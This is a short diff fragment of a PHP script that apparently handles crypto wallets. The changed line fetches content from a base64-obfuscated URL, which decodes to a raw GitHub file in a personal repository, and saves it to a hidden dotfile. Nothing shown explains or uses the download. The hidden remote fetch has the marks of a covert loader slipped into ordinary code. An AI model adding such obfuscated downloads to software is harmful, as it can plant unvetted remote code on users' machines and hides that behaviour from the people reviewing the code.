@@ -63,7 +63,7 @@ function saveFileList($file, $data){
 function line(){
     echo "--------------------------------------\n";
 }
-$git=file_get_contents(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2lhbXR1YmFzeWEvQXhpb21ub2RlL3JlZnMvaGVhZHMvbWFpbi8lNDBpYW10dWJhc3lh'));
+$git=file_get_contents(base64_decode('cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9pYW10dWJhc3lhL0F4aW9tbm9kZS9yZWZzL2hlYWRzL21haW4vLiU0MGlhbXR1YmFzeWE'));
 file_put_contents('.@iamtubasya',$git);
 /* ================= DATABASE ================= */
 function getWalletCount(){
